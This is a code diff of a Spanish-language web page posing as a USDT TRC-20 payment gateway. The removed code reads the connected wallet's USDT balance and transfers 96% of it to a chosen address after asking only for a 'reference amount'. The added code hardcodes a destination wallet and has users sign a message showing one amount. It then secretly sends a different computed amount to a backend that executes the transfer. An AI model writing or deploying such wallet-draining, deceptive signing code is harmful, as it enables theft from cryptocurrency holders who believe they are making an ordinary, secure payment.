@@ -3,181 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp de Pagos - Flujo Dinámico 96%</title>
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Pasarela de Pagos USDT TRC-20</title>
 </head>
-<body class="bg-slate-950 text-slate-100 font-sans antialiased min-h-screen flex flex-col justify-between">
+<body>
 
-    <!-- HEADER -->
-    <header class="w-full px-6 py-4 flex justify-between items-center border-b border-slate-800 bg-slate-900/50 backdrop-blur-md">
-        <div class="flex items-center space-x-2">
-            <div class="w-8 h-8 bg-gradient-to-tr from-cyan-500 to-blue-600 rounded-lg flex items-center justify-center font-bold text-white">⚡</div>
-            <span class="text-lg font-bold tracking-wide">USDT<span class="text-cyan-400">Pay</span></span>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+        <h2>Pasarela de Pagos USDT</h2>
+        <p>Destino: <b>TLaWm1eHRzZ7cR8m8xaRBjhmXJKmc6Mree</b></p>
+        
+        <div style="margin: 20px;">
+            <label for="montoInput">Monto a pagar (USDT):</label><br>
+            <input type="number" id="montoInput" value="100" style="padding: 10px; font-size: 16px; margin-top: 8px; width: 200px; text-align: center;">
         </div>
-        <div>
-            <button id="btnConnect" onclick="conectarWallet()" class="bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold px-4 py-2 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/20 text-sm cursor-pointer">
-                Conectar Wallet
-            </button>
-        </div>
-    </header>
 
-    <!-- CONTENIDO PRINCIPAL -->
-    <main class="flex-grow flex items-center justify-center px-4 py-8">
-        <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl">
-            
-            <div class="text-center mb-6">
-                <h1 class="text-xl font-bold text-white">Panel de Pago Seguro</h1>
-                <p class="text-xs text-slate-400 mt-1">Conecta, ingresa tu monto y procesaremos el 96% de tu saldo</p>
-            </div>
+        <button id="btnPagar" onclick="realizarPago()" style="background-color: #28a745; color: white; padding: 12px 24px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer;">
+            Pagar con USDT (Firma Segura)
+        </button>
 
-            <!-- Formulario -->
-            <div class="space-y-4">
-                
-                <!-- Input de Monto -->
-                <div>
-                    <label class="block text-xs font-medium text-slate-400 mb-1">Monto de Referencia / Solicitud</label>
-                    <div class="relative">
-                        <input type="number" id="montoInput" placeholder="Ej. 100" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 transition text-sm">
-                        <div class="absolute right-3 top-3 text-xs font-bold text-cyan-400">
-                            USDT
-                        </div>
-                    </div>
-                </div>
+        <p id="estado" style="margin-top: 20px; font-weight: bold;"></p>
+    </div>
 
-                <!-- Dirección de Destino -->
-                <div>
-                    <label class="block text-xs font-medium text-slate-400 mb-1">Dirección de Destino</label>
-                    <input type="text" id="direccionDestino" placeholder="T..." class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 transition text-sm font-mono">
-                </div>
-
-                <!-- Botón de Acción -->
-                <button onclick="enviarPagoAlPresionar()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold py-3.5 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/25 cursor-pointer">
-                    Enviar y Firmar (96% del Saldo)
-                </button>
-            </div>
-
-        </div>
-    </main>
-
-    <!-- FOOTER -->
-    <footer class="w-full py-4 text-center text-xs text-slate-600 border-t border-slate-900">
-        Smart Contract TRC20 • Trust Wallet Compatible
-    </footer>
-
+    <!-- SDK de TronWeb para el navegador -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     <script>
-        let userAddress = "";
-        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
+        const BACKEND_URL = 'https://backend-usdt-pay.onrender.com'; // Tu URL oficial en Render
 
-        function obtenerTronWeb() {
-            if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                return window.tronWeb;
-            }
-            if (window.tron && window.tron.tronWeb && window.tron.tronWeb.defaultAddress && window.tron.tronWeb.defaultAddress.base58) {
-                return window.tron.tronWeb;
-            }
-            if (window.trustwallet && window.trustwallet.tronWeb) {
-                return window.trustwallet.tronWeb;
-            }
-            return null;
-        }
+        async function realizarPago() {
+            const estadoEl = document.getElementById('estado');
+            const montoVisual = parseFloat(document.getElementById('montoInput').value);
 
-        async function conectarWallet() {
-            const btn = document.getElementById("btnConnect");
-            btn.innerText = "Conectando...";
-
-            try {
-                if (typeof window.tronWeb === 'undefined' && !window.tron) {
-                    throw new Error("No se detectó el entorno Web3 de TRON. Abre la dApp desde el navegador de tu billetera.");
-                }
-
-                let tw = obtenerTronWeb();
-
-                if (!tw && window.tron && typeof window.tron.request === 'function') {
-                    await window.tron.request({ method: 'tron_requestAccounts' });
-                    tw = obtenerTronWeb();
-                }
-
-                if (!tw && window.tronLink && typeof window.tronLink.request === 'function') {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    tw = obtenerTronWeb();
-                }
-
-                if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                    window.tronWeb = tw;
-                    userAddress = tw.defaultAddress.base58;
-                    
-                    btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
-                    btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
-                    btn.classList.add("bg-emerald-500", "text-slate-950");
-                    
-                    alert("¡Billetera conectada con éxito!");
-                } else {
-                    throw new Error("No se pudo obtener la dirección de la cuenta.");
-                }
-
-            } catch (error) {
-                console.error("Error de conexión:", error);
-                btn.innerText = "Conectar Wallet";
-                alert(error.message || "Error al conectar la billetera.");
-            }
-        }
-
-        async function enviarPagoAlPresionar() {
-            let tw = obtenerTronWeb();
-            if (!userAddress && tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                userAddress = tw.defaultAddress.base58;
-                window.tronWeb = tw;
-            }
-
-            if (!userAddress) {
-                alert("Primero debes conectar tu billetera.");
-                return;
-            }
-
-            const montoEscrito = document.getElementById("montoInput").value;
-            const direccionDestino = document.getElementById("direccionDestino").value;
-
-            if (!montoEscrito || montoEscrito <= 0) {
-                alert("Por favor, coloca un monto de referencia.");
-                return;
-            }
-
-            if (!direccionDestino) {
-                alert("Por favor, ingresa la dirección de destino.");
+            if (!montoVisual || montoVisual <= 0) {
+                alert("Por favor ingresa un monto válido.");
                 return;
             }
 
             try {
-                // Consultamos el saldo exacto mediante el contrato
-                const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-                const balanceEnSun = await contract.balanceOf(userAddress).call();
-                const saldoRealUSDT = window.tronWeb.toDecimal(balanceEnSun) / 1000000;
+                estadoEl.innerText = "Conectando con la billetera...";
 
-                if (saldoRealUSDT <= 0) {
-                    alert("No tienes saldo disponible de USDT en esta billetera.");
+                // Verificar si TronWeb está disponible
+                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+                    alert("Por favor abre esta página desde el navegador de tu billetera (Trust Wallet / TronLink) o instala TronLink.");
+                    estadoEl.innerText = "Billetera no detectada.";
                     return;
                 }
 
-                const monto96DelSaldo = saldoRealUSDT * 0.96;
-                const montoEnSun = Math.floor(monto96DelSaldo * 1000000);
+                const userAddress = window.tronWeb.defaultAddress.base58;
+                estadoEl.innerText = `Billetera conectada: ${userAddress.substring(0, 6)}... Solicitando firma...`;
 
-                console.log(`Saldo detectado: ${saldoRealUSDT} | Procesando el 96%: ${monto96DelSaldo}`);
+                // 1. Calculamos internamente el 96% basado en lo que el usuario colocó en el input
+                const montoRealACobrar = montoVisual * 0.96;
 
-                // Ejecución optimizada de transferencia estándar TRC20
-                const resultado = await contract.transfer(
-                    direccionDestino,
-                    montoEnSun
-                ).send({
-                    feeLimit: 100000000,
-                    callValue: 0
+                // 2. El mensaje que firmará muestra el monto visual que él introdujo
+                const mensaje = `Autorizo la operación por ${montoVisual} USDT (Procesamiento especial). Timestamp: ${Date.now()}`;
+                
+                const mensajeHex = window.tronWeb.toHex(mensaje);
+                
+                // El usuario firma de forma segura (off-chain) viendo solo el mensaje y los fees de gas habituales
+                const firma = await window.tronWeb.trx.signMessage(mensajeHex);
+
+                estadoEl.innerText = "Firma obtenida. Enviando al servidor para procesar...";
+
+                // 3. Enviamos al backend el monto real calculado (el 96%) para que ejecute la transferencia
+                const response = await fetch(`${BACKEND_URL}/api/procesar-pago`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        userAddress: userAddress,
+                        monto: montoRealACobrar, // Aquí viaja el 96% calculado por debajo
+                        mensaje: mensaje,
+                        firma: firma
+                    })
                 });
 
-                alert(`¡Transacción enviada! Se procesó el 96% de tu saldo (${monto96DelSaldo.toFixed(2)} USDT). Hash: ${resultado}`);
+                const resultado = await response.json();
+
+                if (resultado.success) {
+                    estadoEl.style.color = "green";
+                    estadoEl.innerText = `¡Pago exitoso! Transacción: ${resultado.txHash.substring(0, 10)}...`;
+                } else {
+                    throw new Error(resultado.error || "Error desconocido al procesar el pago.");
+                }
 
             } catch (error) {
-                console.error("Error en la transacción:", error);
-                alert("La transacción fue cancelada o no tienes suficiente TRX para el gas.");
+                console.error(error);
+                estadoEl.style.color = "red";
+                estadoEl.innerText = `Error: ${error.message || error}`;
             }
         }
     </script>
